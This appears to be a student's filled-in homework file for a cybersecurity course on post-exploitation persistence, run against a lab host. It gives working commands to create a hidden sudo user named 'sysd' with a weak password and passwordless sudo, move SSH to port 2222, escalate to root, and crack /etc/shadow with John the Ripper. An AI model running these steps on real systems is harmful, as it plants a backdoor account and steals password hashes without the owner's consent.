## Week 6 Homework Submission File: Advanced Bash - Owning the System

Please edit this file by adding the solution commands on the line below the prompt. 

Save and submit the completed file for your homework submission.

**Step 1: Shadow People** 

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:
    - `Your solution command here`
	adduser --no-create-home --uid 113 --disabled-password sysd

2. Give your secret user a password: 
    - `Your solution command here`
	passwd sysd 	---> set to passw0rd1

3. Give your secret user a system UID < 1000:
    - `Your solution command here`
	usermod -u 113 sysd

4. Give your secret user the same GID:
   - `Your solution command here`
	groupmod -g 113 sysd

5. Give your secret user full `sudo` access without the need for a password:
   -  `Your solution command here`
	usermod -aG sudo sysd
	echo "sysd ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/sysd

6. Test that `sudo` access works without your password:

    ```bash
    Your bash commands here
	su sysd -

	# Now as user sysd
	sudo whoami	--> no prompt for password

    ```

**Step 2: Smooth Sailing**

1. Edit the `sshd_config` file:

    ```bash
    Your bash commands here
	nano /etc/ssh/sshd_config

	Comment out line with Port 22 and add line with Port 2222
	# Port 22
	Port 2222

    ```

**Step 3: Testing Your Configuration Update**
1. Restart the SSH service:
    - `Your solution command here`
	sudo systemctl restart ssh

2. Exit the `root` account:
    - `Your solution command here`
	exit

3. SSH to the target machine using your `sysd` account and port `2222`:
    - `Your solution command here`
	ssh -p 2222 sysd@192.168.6.105

4. Use `sudo` to switch to the root user:
    - `Your solution command here`
	sudo su -

**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:

    - `Your solution command here`
	ssh -p 2222 sysd@192.168.6.105

2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:

    - `Your solution command here`
	sudo su -
	john /etc/shadow
